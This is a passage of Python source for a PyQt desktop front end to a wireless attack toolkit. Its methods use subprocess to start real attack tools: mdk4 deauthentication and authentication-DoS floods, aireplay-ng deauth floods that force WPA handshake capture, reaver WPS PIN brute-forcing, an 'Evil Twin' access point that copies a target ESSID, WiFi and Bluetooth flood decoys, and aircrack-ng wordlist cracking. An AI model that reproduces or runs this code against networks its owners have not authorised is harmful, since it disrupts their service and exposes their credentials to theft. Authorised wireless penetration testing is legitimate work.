        except json.JSONDecodeError as e:
            QMessageBox.warning(self, "JSON Error", f"Invalid JSON format in criteria: {str(e)}")
        except Exception as e:
            self.log(f"Error defining filter profile: {str(e)}")
            QMessageBox.warning(self, "Error", f"Failed to define filter profile: {str(e)}")

    def apply_filter_profile(self):
        try:
            name = self.filter_name.text().strip()
            if not name:
                QMessageBox.warning(self, "Input Error", "Please provide a filter profile name.")
                return
            if hasattr(self, 'network_filter_manager') and self.network_filter_manager:
                if self.network_filter_manager.apply_filter_profile(name):
                    self.log(f"Applied network filter profile: {name}")
                    self.filter_status.setText(f"Filter Status: Active - {name}")
                    QMessageBox.information(self, "Success", f"Filter profile '{name}' applied successfully.")
                else:
                    QMessageBox.warning(self, "Apply Failed", f"Filter profile '{name}' not found.")
            else:
                QMessageBox.warning(self, "Feature Unavailable", "Network Filter Manager is not available.")
        except Exception as e:
            self.log(f"Error applying filter profile: {str(e)}")
            QMessageBox.warning(self, "Error", f"Failed to apply filter profile: {str(e)}")

    def create_decoys_tab(self):
        decoy_tab = QWidget()
        layout = QVBoxLayout()

        wifi_group = QGroupBox("WiFi Decoy Networks")
        wifi_layout = QGridLayout()
        wifi_layout.addWidget(QLabel("WiFi AP Name:"), 0, 0)
        self.wifi_ap_name = QLineEdit()
        self.wifi_ap_name.setPlaceholderText("Default: WiFi_Marauder")
        wifi_layout.addWidget(self.wifi_ap_name, 0, 1)
        wifi_start = QPushButton("Start WiFi Decoy")
        wifi_start.clicked.connect(self.start_wifi_decoy)
        wifi_layout.addWidget(wifi_start, 1, 0)
        wifi_stop = QPushButton("Stop WiFi Decoy")
        wifi_stop.clicked.connect(self.stop_wifi_decoy)
        wifi_layout.addWidget(wifi_stop, 1, 1)
        self.wifi_decoy_status = QLabel("WiFi Decoy Status: Inactive")
        wifi_layout.addWidget(self.wifi_decoy_status, 2, 0, 1, 2)
        wifi_group.setLayout(wifi_layout)
        layout.addWidget(wifi_group)

        bt_group = QGroupBox("Bluetooth Decoy Devices")
        bt_layout = QGridLayout()
        bt_layout.addWidget(QLabel("Bluetooth Device Name:"), 0, 0)
        self.bt_device_name = QLineEdit()
        self.bt_device_name.setPlaceholderText("Default: BT_Marauder")
        bt_layout.addWidget(self.bt_device_name, 0, 1)
        bt_start = QPushButton("Start Bluetooth Decoy")
        bt_start.clicked.connect(self.start_bt_decoy)
        bt_layout.addWidget(bt_start, 1, 0)
        bt_stop = QPushButton("Stop Bluetooth Decoy")
        bt_stop.clicked.connect(self.stop_bt_decoy)
        bt_layout.addWidget(bt_stop, 1, 1)
        self.bt_decoy_status = QLabel("Bluetooth Decoy Status: Inactive")
        bt_layout.addWidget(self.bt_decoy_status, 2, 0, 1, 2)
        bt_group.setLayout(bt_layout)
        layout.addWidget(bt_group)

        layout.addStretch()
        decoy_tab.setLayout(layout)
        return decoy_tab

    def start_wifi_decoy(self):
        try:
            ap_name = self.wifi_ap_name.text().strip() or "WiFi_Marauder"
            if self.decoy_manager:
                res = self.decoy_manager.start_wifi_flood(num_aps=1, custom_ssids=[ap_name])
                if res.get("success"):
                    self.log(f"Started WiFi decoy network with name: {ap_name}")
                    self.wifi_decoy_status.setText(f"WiFi Decoy Status: Active - {ap_name}")
                else:
                    QMessageBox.warning(self, "Start Failed", res.get("message", "Failed to start WiFi decoy network."))
            else:
                QMessageBox.warning(self, "Feature Unavailable", "Decoy Network Manager is not available.")
        except Exception as e:
            self.log(f"Error starting WiFi decoy: {str(e)}")
            QMessageBox.warning(self, "Error", f"Failed to start WiFi decoy: {str(e)}")

    def stop_wifi_decoy(self):
        try:
            if self.decoy_manager:
                res = self.decoy_manager.stop_wifi_flood()
                if res.get("success"):
                    self.log("Stopped WiFi decoy network.")
                    self.wifi_decoy_status.setText("WiFi Decoy Status: Inactive")
                else:
                    QMessageBox.warning(self, "Stop Failed", res.get("message", "No active WiFi decoy network to stop."))
            else:
                QMessageBox.warning(self, "Feature Unavailable", "Decoy Network Manager is not available.")
        except Exception as e:
            self.log(f"Error stopping WiFi decoy: {str(e)}")
            QMessageBox.warning(self, "Error", f"Failed to stop WiFi decoy: {str(e)}")

    def start_bt_decoy(self):
        try:
            device_name = self.bt_device_name.text().strip() or "BT_Marauder"
            if self.decoy_manager:
                res = self.decoy_manager.start_bluetooth_flood(num_devices=1, custom_names=[device_name])
                if res.get("success"):
                    self.log(f"Started Bluetooth decoy device with name: {device_name}")
                    self.bt_decoy_status.setText(f"Bluetooth Decoy Status: Active - {device_name}")
                else:
                    QMessageBox.warning(self, "Start Failed", res.get("message", "Failed to start Bluetooth decoy device."))
            else:
                QMessageBox.warning(self, "Feature Unavailable", "Decoy Network Manager is not available.")
        except Exception as e:
            self.log(f"Error starting Bluetooth decoy: {str(e)}")
            QMessageBox.warning(self, "Error", f"Failed to start Bluetooth decoy: {str(e)}")

    def stop_bt_decoy(self):
        try:
            if self.decoy_manager:
                res = self.decoy_manager.stop_bluetooth_flood()
                if res.get("success"):
                    self.log("Stopped Bluetooth decoy device.")
                    self.bt_decoy_status.setText("Bluetooth Decoy Status: Inactive")
                else:
                    QMessageBox.warning(self, "Stop Failed", res.get("message", "No active Bluetooth decoy device to stop."))
            else:
                QMessageBox.warning(self, "Feature Unavailable", "Decoy Network Manager is not available.")
        except Exception as e:
            self.log(f"Error stopping Bluetooth decoy: {str(e)}")
            QMessageBox.warning(self, "Error", f"Failed to stop Bluetooth decoy: {str(e)}")

    def start_mdk4_attack(self):
        try:
            iface = self.iface_selector.currentText()
            bssid = self.mdk4_bssid.text().strip()
            mode = self.mdk4_mode.currentText()
            intensity = self.mdk4_intensity.value()
            if not bssid:
                QMessageBox.warning(self, "Input Error", "Please provide a target BSSID.")
                return
            # Map mode to MDK4 command
            if mode == "Bandwidth Throttling":
                cmd = ["mdk4", iface, "t", "-a", bssid, "-i", str(intensity)]
            elif mode == "Beacon Flooding":
                cmd = ["mdk4", iface, "b", "-a", bssid, "-c", str(intensity)]
            elif mode == "Authentication DoS":
                cmd = ["mdk4", iface, "a", "-a", bssid, "-i", str(intensity)]
            else:  # Deauthentication Flood
                cmd = ["mdk4", iface, "d", "-a", bssid, "-i", str(intensity)]
            # Start MDK4 process
            self.mdk4_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.mdk4_active = True
            self.mdk4_progress.setValue(0)
            self.mdk4_status.setText(f"MDK4 Attack Status: Running {mode}")
            # Timer for progress updates
            self.mdk4_timer = QTimer(self)
            self.mdk4_timer.timeout.connect(self.update_mdk4_progress)
            self.mdk4_timer.start(1000)
            self.log(f"Started MDK4 {mode} on {bssid} with intensity {intensity}")
        except Exception as e:
            self.log(f"Error starting MDK4 attack: {e}")
            QMessageBox.warning(self, "Error", f"Failed to start attack: {e}")

    def update_mdk4_progress(self):
        if not hasattr(self, 'mdk4_active') or not self.mdk4_active:
            if hasattr(self, 'mdk4_timer'):
                self.mdk4_timer.stop()
            return
        progress = min(100, self.mdk4_progress.value() + 10)
        self.mdk4_progress.setValue(progress)
        if progress == 100:
            if hasattr(self, 'mdk4_timer'):
                self.mdk4_timer.stop()
            self.mdk4_active = False
            self.log("MDK4 attack simulation completed")
            self.mdk4_status.setText("MDK4 Attack Status: Completed")

    def stop_mdk4_attack(self):
        """Stop an ongoing MDK4 attack."""
        try:
            proc = getattr(self, 'mdk4_process', None)
            if proc and proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=5)
            if hasattr(self, 'mdk4_timer'):
                self.mdk4_timer.stop()
            self.mdk4_active = False
            self.mdk4_progress.setValue(0)
            self.mdk4_status.setText("MDK4 Attack Status: Stopped")
            self.log("Stopped MDK4 attack")
        except Exception as e:
            self.log(f"Error stopping MDK4 attack: {e}")
            QMessageBox.warning(self, "Error", f"Failed to stop MDK4 attack: {e}")

    # --------------------------------------------------
    # Graceful shutdown: stop timers & background processes
    # --------------------------------------------------
    def closeEvent(self, event):
        """Ensure timers and subprocesses are stopped before the app exits."""
        try:
            # Stop MDK4 timer
            if hasattr(self, 'mdk4_timer') and self.mdk4_timer is not None:
                self.mdk4_timer.stop()
        except Exception as e:
            print(f"Warning during timer shutdown: {e}")

        # Stop attack sequence manager
        try:
            if hasattr(self, 'attack_sequence_manager') and self.attack_sequence_manager:
                if hasattr(self.attack_sequence_manager, 'stop'):
                    self.attack_sequence_manager.stop()
        except Exception as e:
            print(f"Warning stopping attack sequence manager: {e}")

        # Stop decoy activities
        try:
            if hasattr(self, 'decoy_manager') and self.decoy_manager:
                if getattr(self.decoy_manager, 'is_wifi_flooding', False):
                    self.decoy_manager.stop_wifi_flood()
                if getattr(self.decoy_manager, 'is_bt_flooding', False):
                    self.decoy_manager.stop_bluetooth_flood()
        except Exception as e:
            print(f"Warning stopping decoys: {e}")

        # Close database connection if open
        try:
            if hasattr(self, 'db') and self.db:
                self.db.close()
        except Exception as e:
            print(f"Warning closing database: {e}")

        super().closeEvent(event)

    # ---------------------------
    # Theming helpers
    # ---------------------------
    def apply_theme(self):
        """Apply dark or light theme using qdarktheme if available, else fallback."""
        if qdarktheme is not None:
            qdarktheme.setup_theme("dark" if self.is_dark_theme else "light")
        else:
            # Minimal fallback: change base palette
            palette = self.palette()
            if self.is_dark_theme:
                palette.setColor(palette.Window, Qt.black)
                palette.setColor(palette.WindowText, Qt.white)
            else:
                palette = QApplication.style().standardPalette()
            QApplication.setPalette(palette)

    def toggle_theme(self):
        """Switch between dark and light themes."""
        self.is_dark_theme = not self.is_dark_theme
        self.apply_theme()

    # ---------------------------
    # Logging helper
    # ---------------------------
    def log(self, message):
        """Log a message to the dashboard and optionally to the database."""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if hasattr(self, 'recent_logs'):
                if self.recent_logs.toPlainText().strip() == "No recent logs":
                    self.recent_logs.clear()
                self.recent_logs.append(f"{timestamp}: {message}")
        except Exception:
            pass

    # ---------------------------
    # Placeholder tabs for unimplemented sections
    # ---------------------------
    def create_anonymity_tab(self):
        anonymity_tab = QWidget()
        layout = QVBoxLayout(anonymity_tab)
        layout.addWidget(QLabel("Anonymity Tools interface coming soon."))
        layout.addStretch()
        anonymity_tab.setLayout(layout)
        return anonymity_tab

    def create_sequence_tab(self):
        """Visual Attack Sequence Builder tab."""
        sequence_tab = QWidget()
        layout = QVBoxLayout(sequence_tab)

        # List of steps
        self.seq_list = QListWidget()
        layout.addWidget(self.seq_list)

        # Buttons to add/edit/remove steps
        btn_layout = QHBoxLayout()
        add_btn = QPushButton("Add Step")
        add_btn.clicked.connect(self.add_sequence_step)
        btn_layout.addWidget(add_btn)
        edit_btn = QPushButton("Edit Step")
        edit_btn.clicked.connect(self.edit_sequence_step)
        btn_layout.addWidget(edit_btn)
        del_btn = QPushButton("Remove Step")
        del_btn.clicked.connect(self.remove_sequence_step)
        btn_layout.addWidget(del_btn)
        layout.addLayout(btn_layout)

        # Define / start / stop sequence
        define_btn = QPushButton("Define Sequence")
        define_btn.clicked.connect(self.define_sequence_from_builder)
        layout.addWidget(define_btn)
        start_btn = QPushButton("Start Sequence")
        start_btn.clicked.connect(self.start_attack_sequence)
        layout.addWidget(start_btn)
        stop_btn = QPushButton("Stop Sequence")
        stop_btn.clicked.connect(self.stop_attack_sequence)
        layout.addWidget(stop_btn)

        self.builder_status = QLabel("Sequence: Idle")
        layout.addWidget(self.builder_status)

        sequence_tab.setLayout(layout)
        # Internal step storage
        self.sequence_steps_list = []
        return sequence_tab

    def add_sequence_step(self):
        text, ok = QInputDialog.getText(self, "New Step", "Enter step JSON:")
        if not ok or not text.strip():
            return
        try:
            step = json.loads(text)
            if not isinstance(step, dict):
                raise ValueError("Step must be a JSON object")
        except Exception as e:
            QMessageBox.warning(self, "JSON Error", f"Invalid JSON: {e}")
            return
        self.sequence_steps_list.append(step)
        self.seq_list.addItem(json.dumps(step))

    def edit_sequence_step(self):
        idx = self.seq_list.currentRow()
        if idx < 0:
            return
        old = self.sequence_steps_list[idx]
        text, ok = QInputDialog.getText(self, "Edit Step", "Modify step JSON:", text=json.dumps(old))
        if not ok or not text.strip():
            return
        try:
            step = json.loads(text)
            if not isinstance(step, dict):
                raise ValueError("Step must be a JSON object")
        except Exception as e:
            QMessageBox.warning(self, "JSON Error", f"Invalid JSON: {e}")
            return
        self.sequence_steps_list[idx] = step
        self.seq_list.item(idx).setText(json.dumps(step))

    def remove_sequence_step(self):
        idx = self.seq_list.currentRow()
        if idx < 0:
            return
        self.sequence_steps_list.pop(idx)
        self.seq_list.takeItem(idx)

    def define_sequence_from_builder(self):
        name, ok = QInputDialog.getText(self, "Sequence Name", "Enter sequence name:")
        if not ok or not name.strip():
            return
        if not self.sequence_steps_list:
            QMessageBox.warning(self, "No Steps", "Add at least one step before defining sequence.")
            return
        if self.attack_sequence_manager:
            try:
                self.attack_sequence_manager.define_sequence(name.strip(), list(self.sequence_steps_list))
                QMessageBox.information(self, "Defined", f"Sequence '{name}' defined.")
                self.builder_status.setText(f"Sequence: {name} (defined)")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Failed to define sequence: {e}")
        else:
            QMessageBox.warning(self, "Unavailable", "Attack Sequence Manager not available.")

    def create_filters_tab(self):
        filters_tab = QWidget()
        layout = QVBoxLayout(filters_tab)
        layout.addWidget(QLabel("Network Filters interface coming soon."))
        layout.addStretch()
        filters_tab.setLayout(layout)
        return filters_tab

    def create_wps_tab(self):
        wps_tab = QWidget()
        layout = QVBoxLayout(wps_tab)
        # Wash WPS scan
        wash_group = QGroupBox("WPS Network Scan (wash)")
        wash_layout = QGridLayout()
        wash_layout.addWidget(QLabel("Interface:"), 0, 0)
        self.wash_iface = QComboBox()
        self.wash_iface.addItems(self.interfaces)
        wash_layout.addWidget(self.wash_iface, 0, 1)
        self.wash_start_btn = QPushButton("Start Wash Scan")
        self.wash_start_btn.clicked.connect(self.start_wash_scan)
        wash_layout.addWidget(self.wash_start_btn, 1, 0)
        self.wash_stop_btn = QPushButton("Stop Wash Scan")
        self.wash_stop_btn.clicked.connect(self.stop_wash_scan)
        wash_layout.addWidget(self.wash_stop_btn, 1, 1)
        self.wash_output = QTextEdit()
        self.wash_output.setReadOnly(True)
        wash_layout.addWidget(self.wash_output, 2, 0, 1, 2)
        wash_group.setLayout(wash_layout)
        layout.addWidget(wash_group)
        # Reaver WPS brute-force
        reaver_group = QGroupBox("WPS Brute-Force (reaver)")
        reaver_layout = QGridLayout()
        reaver_layout.addWidget(QLabel("Interface:"), 0, 0)
        self.reaver_iface = QComboBox()
        self.reaver_iface.addItems(self.interfaces)
        reaver_layout.addWidget(self.reaver_iface, 0, 1)
        reaver_layout.addWidget(QLabel("Target BSSID:"), 1, 0)
        self.reaver_bssid = QLineEdit()
        reaver_layout.addWidget(self.reaver_bssid, 1, 1)
        reaver_layout.addWidget(QLabel("PIN (optional):"), 2, 0)
        self.reaver_pin = QLineEdit()
        reaver_layout.addWidget(self.reaver_pin, 2, 1)
        self.reaver_start_btn = QPushButton("Start Reaver")
        self.reaver_start_btn.clicked.connect(self.start_reaver)
        reaver_layout.addWidget(self.reaver_start_btn, 3, 0)
        self.reaver_stop_btn = QPushButton("Stop Reaver")
        self.reaver_stop_btn.clicked.connect(self.stop_reaver)
        reaver_layout.addWidget(self.reaver_stop_btn, 3, 1)
        self.reaver_output = QTextEdit()
        self.reaver_output.setReadOnly(True)
        reaver_layout.addWidget(self.reaver_output, 4, 0, 1, 2)
        reaver_group.setLayout(reaver_layout)
        layout.addWidget(reaver_group)
        layout.addStretch()
        wps_tab.setLayout(layout)
        return wps_tab
    
    # ---------------------------
    # WPS Helper Methods for wash and reaver
    # ---------------------------
    def start_wash_scan(self):
        iface = self.wash_iface.currentText()
        self.wash_output.clear()
        try:
            self.wash_process = subprocess.Popen(
                ['wash', '-i', iface], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            self.wash_timer = QTimer(self)
            self.wash_timer.timeout.connect(self._update_wash_output)
            self.wash_timer.start(500)
            self.log(f"Started wash scan on {iface}")
        except Exception as e:
            QMessageBox.warning(self, "Wash Error", str(e))

    def _update_wash_output(self):
        try:
            if hasattr(self, 'wash_process') and self.wash_process.stdout:
                rlist, _, _ = select.select([self.wash_process.stdout], [], [], 0)
                for fp in rlist:
                    line = fp.readline()
                    if line:
                        self.wash_output.moveCursor(QTextCursor.End)
                        self.wash_output.insertPlainText(line)
        except Exception:
            pass

    def stop_wash_scan(self):
        try:
            if hasattr(self, 'wash_timer'):
                self.wash_timer.stop()
            proc = getattr(self, 'wash_process', None)
            if proc and proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=5)
            self.log("Stopped wash scan")
        except Exception as e:
            QMessageBox.warning(self, "Wash Stop Error", str(e))

    def start_reaver(self):
        iface = self.reaver_iface.currentText()
        bssid = self.reaver_bssid.text().strip()
        pin = self.reaver_pin.text().strip()
        if not bssid:
            QMessageBox.warning(self, "Input Error", "Please provide a target BSSID for reaver.")
            return
        cmd = ['reaver', '-i', iface, '-b', bssid, '-vv']
        if pin:
            cmd += ['-p', pin]
        try:
            self.reaver_output.clear()
            self.reaver_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            self.reaver_timer = QTimer(self)
            self.reaver_timer.timeout.connect(self._update_reaver_output)
            self.reaver_timer.start(500)
            self.log(f"Started reaver on {bssid} (PIN: {pin or 'auto'})")
        except Exception as e:
            QMessageBox.warning(self, "Reaver Error", str(e))

    def _update_reaver_output(self):
        try:
            if hasattr(self, 'reaver_process') and self.reaver_process.stdout:
                rlist, _, _ = select.select([self.reaver_process.stdout], [], [], 0)
                for fp in rlist:
                    line = fp.readline()
                    if line:
                        self.reaver_output.moveCursor(QTextCursor.End)
                        self.reaver_output.insertPlainText(line)
                        if 'WPS PIN' in line or 'key calculated' in line.lower():
                            self.log(f"Reaver output: {line.strip()}")
        except Exception:
            pass

    def stop_reaver(self):
        try:
            if hasattr(self, 'reaver_timer'):
                self.reaver_timer.stop()
            proc = getattr(self, 'reaver_process', None)
            if proc and proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=5)
            self.log("Stopped reaver")
        except Exception as e:
            QMessageBox.warning(self, "Reaver Stop Error", str(e))

    def create_logs_tab(self):
        logs_tab = QWidget()
        layout = QVBoxLayout(logs_tab)
        layout.addWidget(QLabel("Logs & Analysis coming soon."))
        layout.addStretch()
        logs_tab.setLayout(layout)
        return logs_tab
    # ---------------------------
    # Analytics tab and update methods
    # ---------------------------
    def create_analytics_tab(self):
        """Tab displaying various analytics based on scan and attack logs."""
        analytics_tab = QWidget()
        layout = QVBoxLayout(analytics_tab)
        # AP Vendor distribution
        self.ap_vendor_chart = FigureCanvas(Figure(figsize=(5, 3)))
        layout.addWidget(self.ap_vendor_chart)
        # Handshake captures per ESSID
        self.handshake_chart = FigureCanvas(Figure(figsize=(5, 3)))
        layout.addWidget(self.handshake_chart)
        # Attack distribution pie chart
        self.attack_chart = FigureCanvas(Figure(figsize=(5, 3)))
        layout.addWidget(self.attack_chart)
        # Refresh button
        refresh_btn = QPushButton("Refresh Analytics")
        refresh_btn.clicked.connect(self.update_analytics)
        layout.addWidget(refresh_btn)
        analytics_tab.setLayout(layout)
        # Initial draw
        QTimer.singleShot(0, self.update_analytics)
        return analytics_tab

    def update_analytics(self):
        """Query the database and redraw all analytics charts."""
        # Vendor distribution
        vendor_counts = Counter()
        for _id, ts, iface, dur, output in self.db_manager.get_scan_logs():
            try:
                nets = json.loads(output)
            except Exception:
                continue
            for net in nets:
                vendor = self.lookup_vendor(net.get('bssid', ''))
                vendor_counts[vendor] += 1
        # Plot
        ax = self.ap_vendor_chart.figure.subplots()
        ax.clear()
        labels = list(vendor_counts.keys())
        values = [vendor_counts[l] for l in labels]
        ax.bar(labels, values)
        ax.set_title("AP Vendor Distribution")
        ax.set_xticklabels(labels, rotation=45, ha='right')
        self.ap_vendor_chart.draw()
        # Handshake captures
        caps = self.db_manager.get_all_captures()
        essid_counts = Counter([c[3] for c in caps])
        ax2 = self.handshake_chart.figure.subplots()
        ax2.clear()
        labels2 = list(essid_counts.keys())
        values2 = [essid_counts[l] for l in labels2]
        ax2.bar(labels2, values2)
        ax2.set_title("Handshakes per ESSID")
        ax2.set_xticklabels(labels2, rotation=45, ha='right')
        self.handshake_chart.draw()
        # Attack distribution
        deauths = len(self.db_manager.get_all_deauths())
        captures = len(caps)
        decoys = len(self.db_manager.get_all_decoy_activities())
        dist = {'Deauths': deauths, 'Captures': captures, 'Decoys': decoys}
        ax3 = self.attack_chart.figure.subplots()
        ax3.clear()
        ax3.pie(dist.values(), labels=dist.keys(), autopct='%1.0f%%')
        ax3.set_title("Attack Distribution")
        self.attack_chart.draw()
    def update_dashboard(self):
        QMessageBox.information(self, "Not implemented", "Dashboard refresh is not yet implemented.")

    def start_scan(self):
        """Start a WiFi scan using airodump-ng, parse results into the table and database."""
        # Start scan via ScanManager
        iface = self.scan_interface.currentText()
        duration = self.scan_duration.value()
        success = self.scan_manager.start(iface, duration)
        if not success:
            QMessageBox.warning(self, "Scan Error", "Failed to start scan.")
            return
        # Prepare UI
        self.scan_progress.setRange(0, 100)
        self.scan_progress.setValue(0)
        self.result_table.setRowCount(0)
        # Clear raw output and reset log position
        try:
            self.scan_output.clear()
        except Exception:
            pass
        self.last_log_pos = 0
        # Timer to update progress and finish
        self.scan_timer = QTimer(self)
        self.scan_timer.timeout.connect(self._update_scan)
        self.scan_timer.start(1000)

    def _update_scan(self):
        """Update scan progress based on ScanManager."""
        elapsed, pct = self.scan_manager.progress()
        self.scan_progress.setValue(pct)
        # Update raw output pane
        try:
            self._update_scan_output()
        except Exception:
            pass
        if pct >= 100:
            self.scan_timer.stop()
            self.finish_scan()

    def finish_scan(self):
        """Finalize scan: stop, parse, update UI and DB."""
        # Stop scan process
        self.scan_manager.stop()
        # Parse and record results
        iface = self.scan_interface.currentText()
        networks = self.scan_manager.record(iface)
        # Populate table
        self.result_table.setRowCount(len(networks))
        for i, net in enumerate(networks):
            self.result_table.setItem(i, 0, QTableWidgetItem(net['bssid']))
            self.result_table.setItem(i, 1, QTableWidgetItem(net['essid']))
            self.result_table.setItem(i, 2, QTableWidgetItem(net['signal']))
            self.result_table.setItem(i, 3, QTableWidgetItem(net['channel']))
            self.result_table.setItem(i, 4, QTableWidgetItem(net['encryption']))
            chk = QTableWidgetItem()
            chk.setCheckState(Qt.Unchecked)
            self.result_table.setItem(i, 5, chk)
        QMessageBox.information(self, "Scan Complete", f"Found {len(networks)} networks")
        # Refresh scan logs tab
        try:
            self.load_scan_logs()
        except Exception:
            pass
    
    def load_scan_logs(self):
        """Load scan logs from the database into the scan logs table."""
        logs = self.db_manager.get_scan_logs()
        self.scanlog_table.setRowCount(len(logs))
        for i, row in enumerate(logs):
            id_, timestamp, iface, duration, output = row
            self.scanlog_table.setItem(i, 0, QTableWidgetItem(str(id_)))
            self.scanlog_table.setItem(i, 1, QTableWidgetItem(timestamp))
            self.scanlog_table.setItem(i, 2, QTableWidgetItem(iface))
            self.scanlog_table.setItem(i, 3, QTableWidgetItem(str(duration)))
            self.scanlog_table.setItem(i, 4, QTableWidgetItem(output))
        self.scanlog_table.resizeRowsToContents()
    
    def _update_scan_output(self):
        """Read new lines from the scan log file and append to the output pane."""
        try:
            log_file = getattr(self.scan_manager, 'log_file', None)
            if log_file:
                with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                    f.seek(self.last_log_pos)
                    data = f.read()
                    if data:
                        self.scan_output.moveCursor(QTextCursor.End)
                        self.scan_output.insertPlainText(data)
                        self.last_log_pos = f.tell()
        except Exception:
            pass

    def start_deauth_attack(self):
        # Deauthentication attack using aireplay-ng
        iface = self.iface_selector.currentText()
        bssid = self.deauth_bssid.text().strip()
        client = self.deauth_client.text().strip()
        count = self.deauth_count.value() if hasattr(self, 'deauth_count') else 5
        if not bssid:
            QMessageBox.warning(self, "Input Error", "Please provide a target BSSID.")
            return
        # Use kit.attacks to start deauth
        try:
            self.deauth_process = start_deauth(iface, bssid, client, count)
            # Progress bar setup
            self.deauth_progress.setRange(0, count)
            self.deauth_sent = 0
            self.deauth_timer = QTimer(self)
            self.deauth_timer.timeout.connect(self._update_deauth_progress)
            self.deauth_timer.start(1000)
            self.log(f"Started deauth: {bssid} ({count} packets)")
        except Exception as e:
            QMessageBox.warning(self, "Deauth Error", str(e))

    def stop_deauth_attack(self):
        # Terminate deauth attack
        try:
            stop_attack(self.deauth_process)
            if getattr(self, 'deauth_timer', None):
                self.deauth_timer.stop()
            self.deauth_progress.setValue(0)
            self.log("Stopped deauth attack")
        except Exception as e:
            QMessageBox.warning(self, "Stop Error", str(e))
    
    def _update_deauth_progress(self):
        """Update the deauthorization progress bar."""
        try:
            self.deauth_sent += 1
            self.deauth_progress.setValue(self.deauth_sent)
            if self.deauth_sent >= self.deauth_progress.maximum():
                if hasattr(self, 'deauth_timer'):
                    self.deauth_timer.stop()
                self.log("Deauth attack simulation completed")
        except Exception:
            pass

    def start_handshake_capture(self):
        # Handshake capture via deauth flood (infinite) to trigger EAPOL frames
        iface = self.iface_selector.currentText()
        bssid = self.handshake_bssid.text().strip()
        if not bssid:
            QMessageBox.warning(self, "Input Error", "Please provide a target BSSID for handshake capture.")
            return
        try:
            # Start deauth flood with count=0 (infinite)
            self.handshake_process = start_deauth(iface, bssid, '', 0)
            # Indeterminate progress bar
            self.handshake_progress.setRange(0, 0)
            # Log scan entry
            scan_id = self.db_manager.insert_scan(iface, 0, f"Handshake capture for {bssid}")
            self.current_handshake_scan_id = scan_id
            self.log(f"Started handshake capture for {bssid}")
        except Exception as e:
            QMessageBox.warning(self, "Handshake Capture Error", str(e))

    def stop_handshake_capture(self):
        # Stop handshake capture
        try:
            stop_attack(self.handshake_process)
            # Reset progress bar
            self.handshake_progress.setRange(0, 100)
            self.handshake_progress.setValue(0)
            bssid = self.handshake_bssid.text().strip()
            # Record capture (handshake) in DB
            scan_id = getattr(self, 'current_handshake_scan_id', None)
            if scan_id:
                self.db_manager.insert_capture(scan_id, bssid, '', '')
            self.log(f"Stopped handshake capture for {bssid}")
        except Exception as e:
            QMessageBox.warning(self, "Stop Error", str(e))

    def start_evil_ap(self):
        # Start Evil Twin AP via DecoyNetworkManager
        essid = self.evilap_essid.text().strip()
        password = self.evilap_password.text().strip()
        if not essid:
            QMessageBox.warning(self, "Input Error", "Please provide an ESSID to mimic.")
            return
        try:
            result = self.decoy_manager.start_wifi_flood(num_aps=1, custom_ssids=[essid])
            self.evilap_progress.setRange(0, 1)
            self.evilap_progress.setValue(1)
            rec_id = self.db_manager.insert_evilap(essid, password, 'started')
            self.current_evilap_id = rec_id
            self.log(f"Started Evil AP: {essid}")
        except Exception as e:
            QMessageBox.warning(self, "Evil AP Error", str(e))

    def stop_evil_ap(self):
        # Stop Evil Twin AP
        try:
            proc = getattr(self.decoy_manager, 'wifi_decoy_process', None)
            if proc and proc.poll() is None:
                proc.terminate()
                proc.wait(timeout=5)
            self.evilap_progress.setValue(0)
            essid = self.evilap_essid.text().strip()
            rec_id = getattr(self, 'current_evilap_id', None)
            if rec_id:
                self.db_manager.insert_evilap(essid, '', 'stopped')
            self.log(f"Stopped Evil AP: {essid}")
        except Exception as e:
            QMessageBox.warning(self, "Stop Error", str(e))

    def start_fakeauth_attack(self):
        # Start FakeAuth attack via deauth-of type "fakeauth"
        iface = self.iface_selector.currentText()
        bssid = self.fakeauth_bssid.text().strip()
        if not bssid:
            QMessageBox.warning(self, "Input Error", "Please provide a target BSSID for FakeAuth.")
            return
        try:
            # Use one deauth packet as fakeauth trigger
            self.fakeauth_process = start_deauth(iface, bssid, '', 1)
            self.fakeauth_progress.setRange(0, 1)
            self.fakeauth_progress.setValue(1)
            scan_id = self.db_manager.insert_scan(iface, 0, f"FakeAuth attack for {bssid}")
            self.current_fakeauth_id = scan_id
            self.db_manager.insert_fakeauth(bssid, '', 'started')
            self.log(f"Started FakeAuth for {bssid}")
        except Exception as e:
            QMessageBox.warning(self, "FakeAuth Error", str(e))

    def stop_fakeauth_attack(self):
        # Stop FakeAuth attack
        try:
            stop_attack(getattr(self, 'fakeauth_process', None))
            self.fakeauth_progress.setValue(0)
            bssid = self.fakeauth_bssid.text().strip()
            rec_id = getattr(self, 'current_fakeauth_id', None)
            if rec_id:
                self.db_manager.insert_fakeauth(bssid, '', 'stopped')
            self.log(f"Stopped FakeAuth for {bssid}")
        except Exception as e:
            QMessageBox.warning(self, "Stop Error", str(e))
    
    def browse_handshake_file(self):
        fname, _ = QFileDialog.getOpenFileName(self, "Select Handshake File", "", "Capture Files (*.cap *.pcap);;All Files (*)")
        if fname:
            self.crack_handshake.setText(fname)

    def browse_wordlist_file(self):
        fname, _ = QFileDialog.getOpenFileName(self, "Select Wordlist File", "", "Wordlist Files (*.txt *.lst);;All Files (*)")
        if fname:
            self.crack_wordlist.setText(fname)

    def start_cracking(self):
        """Start WPA handshake cracking using aircrack-ng."""
        handshake = self.crack_handshake.text().strip()
        wordlist = self.crack_wordlist.text().strip()
        if not os.path.exists(handshake) or not os.path.isfile(handshake):
            QMessageBox.warning(self, "Input Error", "Invalid handshake file path.")
            return
        if not os.path.exists(wordlist) or not os.path.isfile(wordlist):
            QMessageBox.warning(self, "Input Error", "Invalid wordlist file path.")
            return
        try:
            self.crack_manager.start(handshake, wordlist)
            self.crack_progress.setRange(0, 0)
            self.crack_status.setText("Status: Cracking...")
            self.current_crack_id = self.db_manager.insert_crack(handshake, wordlist, 'started', '')
            self.crack_timer = QTimer(self)
            self.crack_timer.timeout.connect(self._update_crack_progress)
            self.crack_timer.start(1000)
            self.log(f"Started WPA cracking on {handshake}")
        except Exception as e:
